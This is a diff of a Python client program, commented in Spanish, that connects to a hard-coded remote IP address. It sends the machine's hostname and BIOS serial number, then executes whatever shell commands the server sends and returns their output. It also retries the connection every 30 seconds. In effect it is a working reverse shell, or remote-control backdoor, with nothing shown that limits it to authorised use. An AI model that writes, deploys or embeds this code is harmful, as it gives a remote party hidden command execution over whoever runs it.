@@ -1,101 +1,16 @@
 import socket
 import json
-import wmi
 import threading
 import os
 import subprocess
 import time
+from clases.cliente import cliente_socket
 
-class ClienteSocket:
-    def _init_(self):
-        self.FORMAT = "utf-8"
-        self.HEADER = 20480
-        # self.IP = '68.183.143.116'
-        self.IP = '165.22.15.159'
-        #self.IP = socket.gethostbyname(socket.gethostname())
-        self.PORT = 5050
-        self.PORT_CLIENTE = 5053
-        self.ADDR = (self.IP, self.PORT)
-        self.ADDR_CLIENTE = (self.IP, self.PORT_CLIENTE)
-
-    def crear_sockets(self):
-        global cliente
-        global cliente_secundario
-
-        try:
-            cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            cliente_secundario = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-            print('Creación de sockets...')
-            return {"success": True, "msg": "Creación de sockets exitosa :)"}
-        
-        except:
-            return {"success": False, "msg": "Hubo un error al crear los sockets :("}
-
-    def conexion_temporal(self):
-        try:
-
-            cliente.connect(self.ADDR)
-
-            respuesta_servidor = json.loads(cliente.recv(self.HEADER).decode(self.FORMAT))
-
-            return respuesta_servidor
-    
-        except:
-            cliente.close()
-            cliente_secundario.close()
-
-    def conexion_canal_secundario(self):
-        try:
-            cliente_secundario.connect(self.ADDR_CLIENTE)
-            return True
-
-        except:
-            cliente.close()
-            cliente_secundario.close()
-            return False
-
-    def validacion_conexion(self):
-        try:
-            numero_de_serie = self.obtener_numero_serie()
-            cliente.send(socket.gethostname().encode())
-            cliente.send(numero_de_serie.encode())
-
-            respuesta_servidor = json.loads(cliente.recv(self.HEADER).decode(self.FORMAT))
-
-            print(respuesta_servidor)
-
-            return respuesta_servidor
-        
-        except:
-            cliente.close()
-            cliente_secundario.close()
-            return {'success': False, 'msg': 'Error al validar la conexión :('}
-
-    def get_socket_cliente(self):
-        return cliente
-    
-    def get_socket_cliente_secundario(self):
-        return cliente_secundario
-
-    def obtener_numero_serie(self):
-        # Connect to the WMI service
-        c = wmi.WMI()
-
-        # Query for the serial number
-        numero_serie = None
-        for bios in c.Win32_BIOS():
-            numero_serie = bios.SerialNumber.strip()
-            break
-        
-        return numero_serie
-
-
-cliente_socket = ClienteSocket()
-
+#Función de dos hilos que corren en el programa
 def manejar_canal_cliente():
-     while True:
+    while True:
         try:
+            print('Manejar canal de cliente')
             respuesta_servidor = cliente_socket.get_socket_cliente().recv(cliente_socket.HEADER).decode(cliente_socket.FORMAT)
             if respuesta_servidor == ' ':
                 cliente_socket.get_socket_cliente().send(' '.encode())
@@ -122,6 +37,7 @@ def manejar_canal_cliente():
                         cliente_socket.get_socket_cliente().send(json.dumps({'success': True, 'consola': current_wd}).encode())
 
                         manejar_comandos_consola()
+                        print('Salir de manejar comandos')
 
                     else:
                         print('Instruccion no encontrada')
@@ -145,6 +61,7 @@ def manejar_canal_cliente():
                 cliente_socket.get_socket_cliente_secundario().close()
                 break
 
+#Función que permite al servidor saber si el cliente sigue activo
 def manejar_canal_cliente_secundario():
     cliente_socket.get_socket_cliente_secundario().settimeout(5)
     while True:
@@ -159,44 +76,79 @@ def manejar_canal_cliente_secundario():
             cliente_socket.get_socket_cliente_secundario().close()
             break
 
+#Función que maneja los comandos de la consola con respecto al administrador
 def manejar_comandos_consola():
     while True:
-        comando = cliente_socket.get_socket_cliente().recv(cliente_socket.HEADER).decode(cliente_socket.FORMAT)
-        if comando == 'salir':
+        try:
+            comando = cliente_socket.get_socket_cliente().recv(cliente_socket.HEADER).decode(cliente_socket.FORMAT)
+            print(f'Operación a realizar {comando}')
+            if comando == 'salir':
+                print('Dentro del if de salir')
+                break
+
+            if comando[:2] == 'cd':
+                os.chdir(comando[3:])
+
+            if len(comando) > 0:
+                cmd = subprocess.Popen(comando[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = output_bytes.decode(cliente_socket.FORMAT, errors='ignore')
+                current_wd = f'{os.getcwd()}>'
+                cliente_socket.get_socket_cliente().send(str.encode(output_str + current_wd))
+
+        except:
+            print('Ocurrio en la función de manejar comandos en la consola')
             break
 
-        if comando[:2] == 'cd':
-            os.chdir(comando[3:])
-
-        if len(comando) > 0:
-            cmd = subprocess.Popen(comando[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            output_bytes = cmd.stdout.read() + cmd.stderr.read()
-            output_str = output_bytes.decode(cliente_socket.FORMAT, errors='ignore')
-            current_wd = f'{os.getcwd()}>'
-            cliente_socket.get_socket_cliente().send(str.encode(output_str + current_wd))
-
-respuesta = cliente_socket.crear_sockets()
-if respuesta['success']:
-    print(respuesta['msg'])
-    respuesta = cliente_socket.conexion_temporal()
-    print(respuesta)    
+#Función principal
+def main():
+    respuesta = cliente_socket.crear_sockets()
     if respuesta['success']:
         print(respuesta['msg'])
-        respuesta = cliente_socket.validacion_conexion()
+        respuesta = cliente_socket.conexion_temporal()
+        print(respuesta)    
         if respuesta['success']:
-            #Conexión con el canal secundario despúes de la validación del socket principal
-            if cliente_socket.conexion_canal_secundario():
-                cliente_thread = threading.Thread(target=manejar_canal_cliente)
-                cliente_thread.start()
-                cliente_secundario_thread = threading.Thread(target=manejar_canal_cliente_secundario)
-                cliente_secundario_thread.start()
-                print('Esperando instrucciones ...')
+            print(respuesta['msg'])
+            respuesta = cliente_socket.validacion_conexion()
+            if respuesta['success']:
+                #Conexión con el canal secundario despúes de la validación del socket principal
+                if cliente_socket.conexion_canal_secundario():
+                    cliente_thread = threading.Thread(target=manejar_canal_cliente)
+                    cliente_thread.start()
+                    cliente_secundario_thread = threading.Thread(target=manejar_canal_cliente_secundario)
+                    cliente_secundario_thread.start()
+                    print('Esperando instrucciones ...')
 
-            else: 
-                print('Hubo un error al conectar con el canal secundario')
+                else: 
+                    print('Hubo un error al conectar con el canal secundario')
+            else:
+                print(respuesta['msg'])
         else:
             print(respuesta['msg'])
     else:
         print(respuesta['msg'])
-else:
-    print(respuesta['msg'])
+
+#Función para verificar la conexión a internet de la misma
+def verificar_conexion_internet():
+    try:
+        # Attempt to connect to a well-known website
+        socket.create_connection(("www.google.com", 80))
+        return True
+    except OSError:
+        return False
+
+#Realizar conexión la primera vez
+def realizar_conexion():
+    if verificar_conexion_internet():
+        try:
+            main()
+        except:
+            print('Algo sucedio en el programa principal, intentando reconexión...')
+            time.sleep(30)
+            realizar_conexion()
+    else:
+        print('Intentando conexión')
+        time.sleep(30)
+        realizar_conexion()
+
+realizar_conexion()
